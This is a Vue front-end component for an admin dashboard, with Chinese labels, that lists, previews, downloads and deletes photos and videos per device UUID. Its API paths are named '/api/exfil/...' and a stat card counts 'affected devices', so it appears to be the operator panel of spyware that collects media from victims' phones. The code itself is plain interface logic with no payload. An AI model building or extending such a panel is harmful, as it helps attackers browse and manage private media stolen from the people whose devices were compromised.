<template>
  <div class="photos">
    <el-row :gutter="15" class="stats-row">
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #f56c6c;">
              <el-icon size="28"><Picture /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.by_category?.photos || 0 }}</div>
              <div class="stat-label">照片总数</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #e6a23c;">
              <el-icon size="28"><Iphone /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.devices || 0 }}</div>
              <div class="stat-label">受影响设备</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #409eff;">
              <el-icon size="28"><PictureRounded /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ imageCount }}</div>
              <div class="stat-label">图片数量</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #67c23a;">
              <el-icon size="28"><VideoPlay /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ videoCount }}</div>
              <div class="stat-label">视频数量</div>
            </div>
          </div>
        </el-card>
      </el-col>
    </el-row>

    <el-card>
      <div class="search-bar">
        <el-input v-model="filters.device_uuid" placeholder="设备UUID" style="width: 250px;" />
        <el-button type="primary" @click="loadPhotos">查询</el-button>
        <el-button @click="resetFilters">重置</el-button>
      </div>
      
      <el-image-viewer 
        v-if="viewerVisible" 
        :url-list="previewImages" 
        :initial-index="currentIndex" 
        @close="viewerVisible = false" 
      />
      
      <div class="photo-grid">
        <div v-for="photo in photosData" :key="photo.id" class="photo-item">
          <el-image 
            :src="getPhotoUrl(photo)" 
            mode="aspectFill" 
            @click="previewPhoto(photo)"
            style="width: 100%; height: 150px;"
          />
          <div class="photo-info">
            <span class="photo-name">{{ photo.name }}</span>
            <span class="photo-size">{{ formatSize(photo.file_size) }}</span>
          </div>
          <div class="photo-actions">
            <el-button size="small" @click="downloadPhoto(photo)">下载</el-button>
            <el-button size="small" type="danger" @click="deletePhoto(photo.id)">删除</el-button>
          </div>
        </div>
      </div>
      
      <el-pagination
        @size-change="handleSizeChange"
        @current-change="handleCurrentChange"
        :current-page="pagination.page"
        :page-sizes="[10, 20, 50]"
        :page-size="pagination.size"
        :total="pagination.total"
        layout="total, sizes, prev, pager, next, jumper"
      />
    </el-card>
  </div>
</template>

<script setup>
import { ref, reactive, computed, onMounted } from 'vue'
import axios from '../utils/axios'
import { Picture, Iphone, PictureRounded, VideoPlay } from '@element-plus/icons-vue'

const photosData = ref([])
const loading = ref(false)
const viewerVisible = ref(false)
const previewImages = ref([])
const currentIndex = ref(0)
const stats = ref({})

const filters = reactive({
  device_uuid: ''
})

const pagination = reactive({
  page: 1,
  size: 20,
  total: 0
})

const imageCount = computed(() => photosData.value.filter(p => p.name?.match(/\.(jpg|jpeg|png|gif|bmp)$/i)).length)
const videoCount = computed(() => photosData.value.filter(p => p.name?.match(/\.(mp4|mov|avi|mkv)$/i)).length)

function formatSize(size) {
  if (!size) return '-'
  if (size < 1024) return size + ' B'
  if (size < 1024 * 1024) return (size / 1024).toFixed(2) + ' KB'
  return (size / 1024 / 1024).toFixed(2) + ' MB'
}

function getPhotoUrl(photo) {
  return `/api/exfil/${photo.id}/download`
}

function previewPhoto(photo) {
  previewImages.value = photosData.value.map(p => getPhotoUrl(p))
  currentIndex.value = photosData.value.findIndex(p => p.id === photo.id)
  viewerVisible.value = true
}

async function loadStats() {
  try {
    const response = await axios.get('/api/exfil/stats')
    stats.value = response.data
  } catch (error) {
    console.error('加载统计失败:', error)
  }
}

async function loadPhotos() {
  loading.value = true
  try {
    const params = new URLSearchParams()
    params.append('skip', (pagination.page - 1) * pagination.size)
    params.append('limit', pagination.size)
    if (filters.device_uuid) params.append('device_uuid', filters.device_uuid)
    
    const response = await axios.get(`/api/exfil/photos?${params}`)
    photosData.value = response.data
  } catch (error) {
    console.error('加载数据失败:', error)
  } finally {
    loading.value = false
  }
}

async function downloadPhoto(photo) {
  try {
    const response = await axios.get(`/api/exfil/${photo.id}/download`, { responseType: 'blob' })
    const url = window.URL.createObjectURL(new Blob([response.data]))
    const link = document.createElement('a')
    link.href = url
    link.setAttribute('download', photo.name || `photo_${photo.id}.jpg`)
    document.body.appendChild(link)
    link.click()
    link.remove()
  } catch (error) {
    console.error('下载失败:', error)
  }
}

async function deletePhoto(id) {
  if (!confirm('确定要删除这张照片吗？')) return
  try {
    await axios.delete(`/api/exfil/${id}`)
    loadPhotos()
  } catch (error) {
    console.error('删除失败:', error)
  }
}

function resetFilters() {
  filters.device_uuid = ''
  loadPhotos()
}

function handleSizeChange(size) {
  pagination.size = size
  pagination.page = 1
  loadPhotos()
}

function handleCurrentChange(page) {
  pagination.page = page
  loadPhotos()
}

onMounted(() => {
  loadStats()
  loadPhotos()
})
</script>

<style scoped>
.stats-row {
  margin-bottom: 15px;
}

.stat-card {
  display: flex;
  align-items: center;
  gap: 15px;
}

.stat-icon {
  width: 60px;
  height: 60px;
  border-radius: 8px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: white;
}

.stat-info {
  flex: 1;
}

.stat-value {
  font-size: 24px;
  font-weight: bold;
  color: #333;
}

.stat-label {
  font-size: 14px;
  color: #999;
  margin-top: 5px;
}

.search-bar {
  display: flex;
  gap: 10px;
  margin-bottom: 20px;
  flex-wrap: wrap;
}

.photo-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
  gap: 15px;
}

.photo-item {
  background: #fff;
  border-radius: 8px;
  overflow: hidden;
  box-shadow: 0 2px 8px rgba(0,0,0,0.1);
}

.photo-info {
  padding: 10px;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.photo-name {
  font-size: 12px;
  color: #333;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  max-width: 70%;
}

.photo-size {
  font-size: 12px;
  color: #999;
}

.photo-actions {
  padding: 10px;
  display: flex;
  gap: 5px;
  border-top: 1px solid #eee;
}
</style>
